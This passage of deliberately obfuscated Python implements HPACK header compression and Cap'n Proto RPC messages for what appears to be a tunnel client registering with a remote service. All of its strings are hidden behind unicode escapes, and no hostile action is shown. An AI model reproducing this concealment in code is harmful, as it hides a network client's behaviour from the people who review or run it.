8388583, 16777199, 4194266, 2097117, 1048553, 4194267, 4194268, 8388584, 8388585, 2097118, 8388586, 4194269, 4194270, 16777200, 2097119, 4194271, 8388587, 8388588, 2097120, 2097121, 4194272, 2097122, 8388589, 4194273, 8388590, 8388591, 1048554, 4194274, 4194275, 4194276, 8388592, 4194277, 4194278, 8388593, 67108832, 67108833, 1048555, 524273, 4194279, 8388594, 4194280, 33554412, 67108834, 67108835, 67108836, 134217694, 134217695, 67108837, 16777201, 33554413, 524274, 2097123, 67108838, 134217696, 134217697, 67108839, 134217698, 16777202, 2097124, 2097125, 67108840, 67108841, 268435453, 134217699, 134217700, 134217701, 1048556, 16777203, 1048557, 2097126, 4194281, 2097127, 2097128, 8388595, 4194282, 4194283, 33554414, 33554415, 16777204, 16777205, 67108842, 8388596, 67108843, 134217702, 67108844, 67108845, 134217703, 134217704, 134217705, 134217706, 134217707, 268435454, 134217708, 134217709, 134217710, 134217711, 134217712, 67108846, 1073741823)
HUFFMAN_LENGTHS = (13, 23, 28, 28, 28, 28, 28, 28, 28, 24, 30, 28, 28, 30, 28, 28, 28, 28, 28, 28, 28, 28, 30, 28, 28, 28, 28, 28, 28, 28, 28, 28, 6, 10, 10, 12, 13, 6, 8, 11, 10, 10, 8, 11, 8, 6, 6, 6, 5, 5, 5, 6, 6, 6, 6, 6, 6, 6, 7, 8, 15, 6, 12, 10, 13, 6, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 8, 7, 8, 13, 19, 13, 14, 6, 15, 5, 6, 5, 6, 5, 6, 6, 6, 5, 7, 7, 6, 6, 6, 5, 6, 7, 6, 5, 5, 6, 7, 7, 7, 7, 7, 15, 11, 14, 13, 28, 20, 22, 20, 20, 22, 22, 22, 23, 22, 23, 23, 23, 23, 23, 24, 23, 24, 24, 22, 23, 24, 23, 23, 23, 23, 21, 22, 23, 22, 23, 23, 24, 22, 21, 20, 22, 22, 23, 23, 21, 23, 22, 22, 24, 21, 22, 23, 23, 21, 21, 22, 21, 23, 22, 23, 23, 20, 22, 22, 22, 23, 22, 22, 23, 26, 26, 20, 19, 22, 23, 22, 25, 26, 26, 26, 27, 27, 26, 24, 25, 19, 21, 26, 27, 27, 26, 27, 24, 21, 21, 26, 26, 28, 27, 27, 27, 20, 24, 20, 21, 22, 21, 21, 23, 22, 22, 25, 25, 24, 24, 26, 23, 26, 27, 26, 26, 27, 27, 27, 27, 27, 28, 27, 27, 27, 27, 27, 26, 30)

def O0_fn_2():
    O0_var_420 = [None, None, -1, 0]
    for O0_var_421, (O0_var_422, O0_var_423) in enumerate(zip(HUFFMAN_CODES, HUFFMAN_LENGTHS)):
        O0_var_424 = O0_var_420
        for O0_var_425 in range(O0_var_423 - 1, -1, -1):
            O0_var_426 = O0_var_422 >> O0_var_425 & 1
            if O0_var_424[O0_var_426] is None:
                O0_var_424[O0_var_426] = [None, None, -1, O0_var_424[3] + 1]
            O0_var_424 = O0_var_424[O0_var_426]
        O0_var_424[2] = O0_var_421
    return O0_var_420
HUFFMAN_TREE = O0_fn_2()

def O0_fn_3(data):
    O0_var_427 = bytearray()
    O0_var_428 = HUFFMAN_TREE
    O0_var_429 = 0
    O0_var_430 = 0
    for O0_var_431 in data:
        for O0_var_432 in range(7, -1, -1):
            O0_var_433 = O0_var_431 >> O0_var_432 & 1
            O0_var_429 = O0_var_429 << 1 | O0_var_433
            O0_var_430 += 1
            O0_var_428 = O0_var_428[O0_var_433]
            if O0_var_428 is None:
                raise ValueError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0048\\u0075\\u0066\\u0066\\u006d\\u0061\\u006e\\u0020\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067', 'unicode_escape'))
            if O0_var_428[2] >= 0:
                if O0_var_428[2] == 256:
                    raise ValueError(codecs.decode('\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0048\\u0075\\u0066\\u0066\\u006d\\u0061\\u006e\\u0020\\u0045\\u004f\\u0053\\u0020\\u0069\\u006e\\u0073\\u0069\\u0064\\u0065\\u0020\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067', 'unicode_escape'))
                O0_var_427.append(O0_var_428[2])
                O0_var_428 = HUFFMAN_TREE
                O0_var_429 = 0
                O0_var_430 = 0
    if O0_var_430 > 7 or O0_var_429 != (1 << O0_var_430) - 1:
        raise ValueError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0048\\u0075\\u0066\\u0066\\u006d\\u0061\\u006e\\u0020\\u0070\\u0061\\u0064\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'))
    return bytes(O0_var_427)

def O0_fn_4(data, O0_var_434, O0_var_435):
    if O0_var_434 >= len(data):
        raise ValueError(codecs.decode('\\u0074\\u0072\\u0075\\u006e\\u0063\\u0061\\u0074\\u0065\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0069\\u006e\\u0074\\u0065\\u0067\\u0065\\u0072', 'unicode_escape'))
    O0_var_436 = data[O0_var_434]
    O0_var_434 += 1
    O0_var_437 = (1 << O0_var_435) - 1
    O0_var_438 = O0_var_436 & O0_var_437
    if O0_var_438 < O0_var_437:
        return (O0_var_438, O0_var_434)
    O0_var_439 = 0
    while True:
        if O0_var_434 >= len(data):
            raise ValueError(codecs.decode('\\u0074\\u0072\\u0075\\u006e\\u0063\\u0061\\u0074\\u0065\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0069\\u006e\\u0074\\u0065\\u0067\\u0065\\u0072', 'unicode_escape'))
        O0_var_440 = data[O0_var_434]
        O0_var_434 += 1
        O0_var_438 += (O0_var_440 & 127) << O0_var_439
        if O0_var_440 & 128 == 0:
            return (O0_var_438, O0_var_434)
        O0_var_439 += 7
        if O0_var_439 > 28:
            raise ValueError(codecs.decode('\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0069\\u006e\\u0074\\u0065\\u0067\\u0065\\u0072\\u0020\\u0074\\u006f\\u006f\\u0020\\u006c\\u0061\\u0072\\u0067\\u0065', 'unicode_escape'))

def O0_fn_5(data, O0_var_441):
    if O0_var_441 >= len(data):
        raise ValueError(codecs.decode('\\u0074\\u0072\\u0075\\u006e\\u0063\\u0061\\u0074\\u0065\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067', 'unicode_escape'))
    O0_var_442 = bool(data[O0_var_441] & 128)
    O0_var_443, O0_var_441 = O0_fn_4(data, O0_var_441, 7)
    O0_var_444 = O0_var_441 + O0_var_443
    if O0_var_444 > len(data):
        raise ValueError(codecs.decode('\\u0074\\u0072\\u0075\\u006e\\u0063\\u0061\\u0074\\u0065\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067\\u0020\\u0064\\u0061\\u0074\\u0061', 'unicode_escape'))
    O0_var_445 = data[O0_var_441:O0_var_444]
    return (O0_fn_3(O0_var_445) if O0_var_442 else O0_var_445, O0_var_444)

class HpackDecoder:

    def __init__(self):
        self.dynamic = deque()
        self.dynamic_size = 0
        self.max_size = 4096

    def table_entry(self, O0_var_446):
        if O0_var_446 <= 0:
            raise ValueError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0069\\u006e\\u0064\\u0065\\u0078', 'unicode_escape'))
        if O0_var_446 <= len(STATIC_TABLE):
            return STATIC_TABLE[O0_var_446 - 1]
        O0_var_447 = O0_var_446 - len(STATIC_TABLE) - 1
        if O0_var_447 < 0 or O0_var_447 >= len(self.dynamic):
            raise ValueError(codecs.decode('\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0064\\u0079\\u006e\\u0061\\u006d\\u0069\\u0063\\u0020\\u0069\\u006e\\u0064\\u0065\\u0078\\u0020\\u006f\\u0075\\u0074\\u0020\\u006f\\u0066\\u0020\\u0072\\u0061\\u006e\\u0067\\u0065', 'unicode_escape'))
        return self.dynamic[O0_var_447]

    def add(self, name, O0_var_448):
        O0_var_449 = 32 + len(name) + len(O0_var_448)
        if O0_var_449 > self.max_size:
            self.dynamic.clear()
            self.dynamic_size = 0
            return
        while self.dynamic and self.dynamic_size + O0_var_449 > self.max_size:
            O0_var_450, O0_var_451 = self.dynamic.pop()
            self.dynamic_size -= 32 + len(O0_var_450) + len(O0_var_451)
        self.dynamic.appendleft((name, O0_var_448))
        self.dynamic_size += O0_var_449

    def decode(self, data):
        O0_var_452 = []
        O0_var_453 = 0
        while O0_var_453 < len(data):
            O0_var_454 = data[O0_var_453]
            if O0_var_454 & 128:
                O0_var_455, O0_var_453 = O0_fn_4(data, O0_var_453, 7)
                O0_var_452.append(self.table_entry(O0_var_455))
                continue
            if O0_var_454 & 64:
                O0_var_455, O0_var_453 = O0_fn_4(data, O0_var_453, 6)
                if O0_var_455:
                    O0_var_456 = self.table_entry(O0_var_455)[0]
                else:
                    O0_var_457, O0_var_453 = O0_fn_5(data, O0_var_453)
                    O0_var_456 = O0_var_457.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape')).lower()
                O0_var_458, O0_var_453 = O0_fn_5(data, O0_var_453)
                O0_var_459 = O0_var_458.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))
                self.add(O0_var_456, O0_var_459)
                O0_var_452.append((O0_var_456, O0_var_459))
                continue
            if O0_var_454 & 32:
                O0_var_460, O0_var_453 = O0_fn_4(data, O0_var_453, 5)
                if O0_var_460 > 4096:
                    raise ValueError(codecs.decode('\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0074\\u0061\\u0062\\u006c\\u0065\\u0020\\u0073\\u0069\\u007a\\u0065\\u0020\\u0065\\u0078\\u0063\\u0065\\u0065\\u0064\\u0073\\u0020\\u006c\\u0069\\u006d\\u0069\\u0074', 'unicode_escape'))
                self.max_size = O0_var_460
                while self.dynamic and self.dynamic_size > O0_var_460:
                    O0_var_461, O0_var_462 = self.dynamic.pop()
                    self.dynamic_size -= 32 + len(O0_var_461) + len(O0_var_462)
                continue
            O0_var_455, O0_var_453 = O0_fn_4(data, O0_var_453, 4)
            if O0_var_455:
                O0_var_456 = self.table_entry(O0_var_455)[0]
            else:
                O0_var_457, O0_var_453 = O0_fn_5(data, O0_var_453)
                O0_var_456 = O0_var_457.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape')).lower()
            O0_var_458, O0_var_453 = O0_fn_5(data, O0_var_453)
            O0_var_452.append((O0_var_456, O0_var_458.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))))
        return O0_var_452

def O0_fn_6(O0_var_463, O0_var_464, O0_var_465):
    O0_var_466 = (1 << O0_var_464) - 1
    if O0_var_463 < O0_var_466:
        return bytes((O0_var_465 | O0_var_463,))
    O0_var_467 = bytearray((O0_var_465 | O0_var_466,))
    O0_var_463 -= O0_var_466
    while O0_var_463 >= 128:
        O0_var_467.append(O0_var_463 & 127 | 128)
        O0_var_463 >>= 7
    O0_var_467.append(O0_var_463)
    return bytes(O0_var_467)

def O0_fn_7(O0_var_468):
    O0_var_469 = O0_var_468.encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')) if isinstance(O0_var_468, str) else O0_var_468
    return O0_fn_6(len(O0_var_469), 7, 0) + O0_var_469

def O0_fn_8(headers):
    O0_var_470 = bytearray()
    for O0_var_471, O0_var_472 in headers:
        if O0_var_471 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_472 == codecs.decode('\\u0032\\u0030\\u0030', 'unicode_escape'):
            O0_var_470.append(136)
        elif O0_var_471 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_472 == codecs.decode('\\u0032\\u0030\\u0034', 'unicode_escape'):
            O0_var_470.append(137)
        elif O0_var_471 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_472 == codecs.decode('\\u0032\\u0030\\u0036', 'unicode_escape'):
            O0_var_470.append(138)
        elif O0_var_471 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_472 == codecs.decode('\\u0033\\u0030\\u0034', 'unicode_escape'):
            O0_var_470.append(139)
        elif O0_var_471 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_472 == codecs.decode('\\u0034\\u0030\\u0030', 'unicode_escape'):
            O0_var_470.append(140)
        elif O0_var_471 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_472 == codecs.decode('\\u0034\\u0030\\u0034', 'unicode_escape'):
            O0_var_470.append(141)
        elif O0_var_471 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_472 == codecs.decode('\\u0035\\u0030\\u0030', 'unicode_escape'):
            O0_var_470.append(142)
        else:
            O0_var_470.extend(O0_fn_6(0, 4, 0))
            O0_var_470.extend(O0_fn_7(O0_var_471))
            O0_var_470.extend(O0_fn_7(O0_var_472))
    return bytes(O0_var_470)

class CapnpBuilder:

    def __init__(self):
        self.words = []

    def alloc(self, O0_var_473):
        O0_var_474 = len(self.words)
        self.words.extend([0] * O0_var_473)
        return O0_var_474

    def struct_ptr(self, O0_var_475, O0_var_476, O0_var_477, O0_var_478):
        O0_var_479 = O0_var_476 - O0_var_475 - 1
        O0_var_480 = O0_var_479 << 2 & 4294967292
        O0_var_481 = O0_var_477 & 65535 | (O0_var_478 & 65535) << 16
        self.words[O0_var_475] = O0_var_480 | O0_var_481 << 32

    def set_u8(self, O0_var_482, O0_var_483, O0_var_484):
        O0_var_485 = 255 << O0_var_483 * 8
        self.words[O0_var_482] = self.words[O0_var_482] & ~O0_var_485 | (O0_var_484 & 255) << O0_var_483 * 8

    def set_u16(self, O0_var_486, O0_var_487, O0_var_488):
        O0_var_489 = 65535 << O0_var_487 * 8
        self.words[O0_var_486] = self.words[O0_var_486] & ~O0_var_489 | (O0_var_488 & 65535) << O0_var_487 * 8

    def set_u32(self, O0_var_490, O0_var_491, O0_var_492):
        O0_var_493 = 4294967295 << O0_var_491 * 8
        self.words[O0_var_490] = self.words[O0_var_490] & ~O0_var_493 | (O0_var_492 & 4294967295) << O0_var_491 * 8

    def set_u64(self, O0_var_494, O0_var_495):
        self.words[O0_var_494] = O0_var_495 & 18446744073709551615

    def write_bytes(self, O0_var_496, O0_var_497, text=False):
        O0_var_498 = O0_var_497.encode() if isinstance(O0_var_497, str) else bytes(O0_var_497)
        O0_var_499 = len(O0_var_498) + 1 if text else len(O0_var_498)
        O0_var_500 = self.alloc((O0_var_499 + 7) // 8)
        for O0_var_501, O0_var_502 in enumerate(O0_var_498):
            self.set_u8(O0_var_500 + O0_var_501 // 8, O0_var_501 % 8, O0_var_502)
        O0_var_503 = O0_var_500 - O0_var_496 - 1
        O0_var_504 = (O0_var_503 << 2 | 1) & 4294967295
        O0_var_505 = 2 | (O0_var_499 & 536870911) << 3
        self.words[O0_var_496] = O0_var_504 | O0_var_505 << 32

    def write_text_list(self, O0_var_506, O0_var_507):
        if not O0_var_507:
            self.words[O0_var_506] = 0
            return
        O0_var_508 = self.alloc(len(O0_var_507))
        O0_var_509 = O0_var_508 - O0_var_506 - 1
        self.words[O0_var_506] = (O0_var_509 << 2 | 1) & 4294967295 | (6 | len(O0_var_507) << 3) << 32
        for O0_var_510, O0_var_511 in enumerate(O0_var_507):
            self.write_bytes(O0_var_508 + O0_var_510, O0_var_511, True)

    def finish(self):
        return struct.pack(codecs.decode('\\u003c\\u0049\\u0049', 'unicode_escape'), 0, len(self.words)) + b''.join((struct.pack(codecs.decode('\\u003c\\u0051', 'unicode_escape'), O0_var_512) for O0_var_512 in self.words))

def O0_fn_9(O0_var_513):
    O0_var_514 = CapnpBuilder()
    O0_var_515, O0_var_516, O0_var_517 = (O0_var_514.alloc(1), O0_var_514.alloc(1), O0_var_514.alloc(1))
    O0_var_514.struct_ptr(O0_var_515, O0_var_516, 1, 1)
    O0_var_514.set_u16(O0_var_516, 0, 8)
    O0_var_518 = O0_var_514.alloc(1)
    O0_var_514.alloc(1)
    O0_var_514.struct_ptr(O0_var_517, O0_var_518, 1, 1)
    O0_var_514.set_u32(O0_var_518, 0, O0_var_513)
    return O0_var_514.finish()

def O0_fn_10(O0_var_519, O0_var_520, O0_var_521, O0_var_522, O0_var_523, O0_var_524):
    O0_var_525 = CapnpBuilder()
    O0_var_526, O0_var_527, O0_var_528 = (O0_var_525.alloc(1), O0_var_525.alloc(1), O0_var_525.alloc(1))
    O0_var_525.struct_ptr(O0_var_526, O0_var_527, 1, 1)
    O0_var_525.set_u16(O0_var_527, 0, 2)
    O0_var_529, O0_var_530, O0_var_531 = (O0_var_525.alloc(1), O0_var_525.alloc(1), O0_var_525.alloc(1))
    O0_var_532, O0_var_533, O0_var_531 = (O0_var_525.alloc(1), O0_var_525.alloc(1), O0_var_525.alloc(1))
    O0_var_525.struct_ptr(O0_var_528, O0_var_529, 3, 3)
    O0_var_525.set_u32(O0_var_529, 0, O0_var_519)
    O0_var_525.set_u64(O0_var_530, 17804583019846587543)
    O0_var_534, O0_var_535 = (O0_var_525.alloc(1), O0_var_525.alloc(1))
    O0_var_525.struct_ptr(O0_var_532, O0_var_534, 1, 1)
    O0_var_525.set_u16(O0_var_534, 4, 1)
    O0_var_536 = O0_var_525.alloc(1)
    O0_var_525.alloc(1)
    O0_var_525.struct_ptr(O0_var_535, O0_var_536, 1, 1)
    O0_var_525.set_u32(O0_var_536, 0, O0_var_520)
    O0_var_537, O0_var_531 = (O0_var_525.alloc(1), O0_var_525.alloc(1))
    O0_var_525.struct_ptr(O0_var_533, O0_var_537, 0, 2)
    O0_var_538, O0_var_539, O0_var_540, O0_var_541 = (O0_var_525.alloc(1), O0_var_525.alloc(1), O0_var_525.alloc(1), O0_var_525.alloc(1))
    O0_var_525.struct_ptr(O0_var_537, O0_var_538, 1, 3)
    O0_var_525.set_u8(O0_var_538, 0, O0_var_524)
    O0_var_542, O0_var_543 = (O0_var_525.alloc(1), O0_var_525.alloc(1))
    O0_var_525.struct_ptr(O0_var_539, O0_var_542, 0, 2)
    O0_var_525.write_bytes(O0_var_542, O0_var_521, True)
    O0_var_525.write_bytes(O0_var_543, O0_var_522)
    O0_var_525.write_bytes(O0_var_540, O0_var_523)
    O0_var_544, O0_var_545, O0_var_531 = (O0_var_525.alloc(1), O0_var_525.alloc(1), O0_var_525.alloc(1))
    O0_var_525.struct_ptr(O0_var_541, O0_var_544, 1, 2)
    O0_var_546, O0_var_547, O0_var_548, O0_var_549 = (O0_var_525.alloc(1), O0_var_525.alloc(1), O0_var_525.alloc(1), O0_var_525.alloc(1))
    O0_var_525.struct_ptr(O0_var_545, O0_var_546, 0, 4)
    O0_var_525.write_bytes(O0_var_546, uuid.uuid4().bytes)
    O0_var_525.write_text_list(O0_var_547, [codecs.decode('\\u0073\\u0065\\u0072\\u0069\\u0061\\u006c\\u0069\\u007a\\u0065\\u0064\\u005f\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape'), codecs.decode('\\u0061\\u006c\\u006c\\u006f\\u0077\\u005f\\u0072\\u0065\\u006d\\u006f\\u0074\\u0065\\u005f\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067', 'unicode_escape')])
    O0_var_525.write_bytes(O0_var_548, codecs.decode('\\u0032\\u0030\\u0032\\u0034\\u002e\\u0031\\u0030\\u002e\\u0030\\u002d\\u004e\\u0065\\u0078\\u0075\\u0073', 'unicode_escape'), True)
    O0_var_525.write_bytes(O0_var_549, codecs.decode('\\u004e\\u0065\\u0078\\u0075\\u0073\\u002d\\u0050\\u0079\\u0074\\u0068\\u006f\\u006e', 'unicode_escape'), True)
    return O0_var_525.finish()

def O0_fn_11(O0_var_550):
    O0_var_551 = []
    O0_var_552 = 0
    while len(O0_var_550) - O0_var_552 >= 8:
        O0_var_553, O0_var_554 = struct.unpack_from(codecs.decode('\\u003c\\u0049\\u0049', 'unicode_escape'), O0_var_550, O0_var_552)
        O0_var_555 = O0_var_553 + 1
        O0_var_556 = 2 + O0_var_555
        O0_var_557 = O0_var_556 * 4
        if O0_var_557 % 8:
            O0_var_557 += 4
        if len(O0_var_550) - O0_var_552 < O0_var_557:
            break
        O0_var_558 = [O0_var_554]
        for O0_var_559 in range(1, O0_var_555):
            O0_var_558.append(struct.unpack_from(codecs.decode('\\u003c\\u0049', 'unicode_escape'), O0_var_550, O0_var_552 + 4 + O0_var_559 * 4)[0])
        O0_var_560 = O0_var_557 + sum(O0_var_558) * 8
        if len(O0_var_550) - O0_var_552 < O0_var_560:
            break
        if O0_var_555 != 1:
            raise ValueError(codecs.decode('\\u006d\\u0075\\u006c\\u0074\\u0069\\u002d\\u0073\\u0065\\u0067\\u006d\\u0065\\u006e\\u0074\\u0020\\u0043\\u0061\\u0070\\u0027\\u006e\\u0020\\u0050\\u0072\\u006f\\u0074\\u006f\\u0020\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065\\u0020\\u0069\\u0073\\u0020\\u006e\\u006f\\u0074\\u0020\\u0073\\u0075\\u0070\\u0070\\u006f\\u0072\\u0074\\u0065\\u0064', 'unicode_escape'))
        O0_var_551.append(O0_var_550[O0_var_552 + O0_var_557:O0_var_552 + O0_var_560])
        O0_var_552 += O0_var_560
    return (O0_var_551, O0_var_550[O0_var_552:])

def O0_fn_12(O0_var_561, O0_var_562):
    O0_var_563 = O0_var_561[O0_var_562]
    if O0_var_563 & 3 != 0:
        raise ValueError(codecs.decode('\\u0065\\u0078\\u0070\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0043\\u0061\\u0070\\u0027\\u006e\\u0020\\u0050\\u0072\\u006f\\u0074\\u006f\\u0020\\u0073\\u0074\\u0072\\u0075\\u0063\\u0074\\u0020\\u0070\\u006f\\u0069\\u006e\\u0074\\u0065\\u0072', 'unicode_escape'))
    O0_var_564 = O0_var_563 >> 2 & 1073741823
    if O0_var_564 & 536870912:
        O0_var_564 -= 1073741824
    O0_var_565 = O0_var_562 + 1 + O0_var_564
    O0_var_566 = O0_var_563 >> 32 & 65535
    O0_var_567 = O0_var_563 >> 48 & 65535
    if O0_var_565 < 0 or O0_var_565 + O0_var_566 + O0_var_567 > len(O0_var_561):
        raise ValueError(codecs.decode('\\u0043\\u0061\\u0070\\u0027\\u006e\\u0020\\u0050\\u0072\\u006f\\u0074\\u006f\\u0020\\u0070\\u006f\\u0069\\u006e\\u0074\\u0065\\u0072\\u0020\\u006f\\u0075\\u0074\\u0020\\u006f\\u0066\\u0020\\u0062\\u006f\\u0075\\u006e\\u0064\\u0073', 'unicode_escape'))
    return (O0_var_565, O0_var_566, O0_var_567)

def O0_fn_13(O0_var_568, O0_var_569):
    O0_var_570 = O0_var_568[O0_var_569]
    if O0_var_570 & 3 != 1:
        return codecs.decode('', 'unicode_escape')
    O0_var_571 = O0_var_570 >> 2 & 1073741823
    if O0_var_571 & 536870912:
        O0_var_571 -= 1073741824
    O0_var_572 = O0_var_569 + 1 + O0_var_571
    O0_var_573 = O0_var_570 >> 32 & 7
    O0_var_574 = O0_var_570 >> 35
    if O0_var_573 != 2 or O0_var_572 < 0 or O0_var_572 + (O0_var_574 + 7) // 8 > len(O0_var_568):
        return codecs.decode('', 'unicode_escape')
    O0_var_575 = b''.join((struct.pack(codecs.decode('\\u003c\\u0051', 'unicode_escape'), O0_var_576) for O0_var_576 in O0_var_568[O0_var_572:O0_var_572 + (O0_var_574 + 7) // 8]))[:O0_var_574]
    return O0_var_575.rstrip(b'\x00').decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))

def O0_fn_14(data):
    if len(data) % 8 or len(data) < 24:
        raise ValueError(codecs.decode('\\u0073\\u0068\\u006f\\u0072\\u0074\\u0020\\u0043\\u0061\\u0070\\u0027\\u006e\\u0020\\u0050\\u0072\\u006f\\u0074\\u006f\\u0020\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e', 'unicode_escape'))
    O0_var_577 = list(struct.unpack(codecs.decode('\\u003c', 'unicode_escape') + codecs.decode('\\u0051', 'unicode_escape') * (len(data) // 8), data))
    O0_var_578, O0_var_579, O0_var_580 = O0_fn_12(O0_var_577, 0)
    if O0_var_579 < 1 or O0_var_577[O0_var_578] & 65535 != 3:
        raise ValueError(codecs.decode('\\u006e\\u006f\\u0074\\u0020\\u0061\\u006e\\u0020\\u0052\\u0050\\u0043\\u0020\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e\\u0020\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'))
    O0_var_581, O0_var_582, O0_var_583 = O0_fn_12(O0_var_577, O0_var_578 + O0_var_579)
    O0_var_584 = O0_var_577[O0_var_581] >> 48 & 65535
    if O0_var_584 == 1:
        return {codecs.decode('\\u006f\\u006b', 'unicode_escape'): False, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): O0_fn_13(O0_var_577, O0_var_581 + O0_var_582)}
    if O0_var_584 != 0:
        return {codecs.decode('\\u006f\\u006b', 'unicode_escape'): False, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0052\\u0050\\u0043\\u0020\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e\\u0020\\u0075\\u006e\\u0069\\u006f\\u006e\\u0020\\u0025\\u0064', 'unicode_escape') % O0_var_584}
    O0_var_585, O0_var_586, O0_var_587 = O0_fn_12(O0_var_577, O0_var_581 + O0_var_582)
    O0_var_588, O0_var_589, O0_var_590 = O0_fn_12(O0_var_577, O0_var_585 + O0_var_586)
    O0_var_591 = O0_var_577[O0_var_588]
    O0_var_592 = O0_var_591 & 65535
    if O0_var_592 == 0:
        return {codecs.decode('\\u006f\\u006b', 'unicode_escape'): False, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): O0_fn_13(O0_var_577, O0_var_588 + O0_var_589)}
    if O0_var_592 != 1:
        return {codecs.decode('\\u006f\\u006b', 'unicode_escape'): False, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0072\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0075\\u006e\\u0069\\u006f\\u006e\\u0020\\u0025\\u0064', 'unicode_escape') % O0_var_592}
    O0_var_593, O0_var_594, O0_var_595 = O0_fn_12(O0_var_577, O0_var_588 + O0_var_589)
    O0_var_596 = O0_fn_13(O0_var_577, O0_var_593 + O0_var_594 + 1)
    return {codecs.decode('\\u006f\\u006b', 'unicode_escape'): True, codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'): O0_var_596, codecs.decode('\\u0072\\u0065\\u006d\\u006f\\u0074\\u0065\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0064', 'unicode_escape'): bool(O0_var_577[O0_var_593] & 1)}

def O0_fn_15(path):
    O0_var_597 = os.path.splitext(path.rstrip(codecs.decode('\\u002f', 'unicode_escape')))[1].lower()
    return {codecs.decode('\\u002e\\u006a\\u0073', 'unicode_escape'): codecs.decode('\\u0074\\u0065\\u0078\\u0074\\u002f\\u006a\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u006d\\u006a\\u0073', 'unicode_escape'): codecs.decode('\\u0074\\u0065\\u0078\\u0074\\u002f\\u006a\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u0063\\u0073\\u0073', 'unicode_escape'): codecs.decode('\\u0074\\u0065\\u0078\\u0074\\u002f\\u0063\\u0073\\u0073\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u006a\\u0073\\u006f\\u006e', 'unicode_escape'): 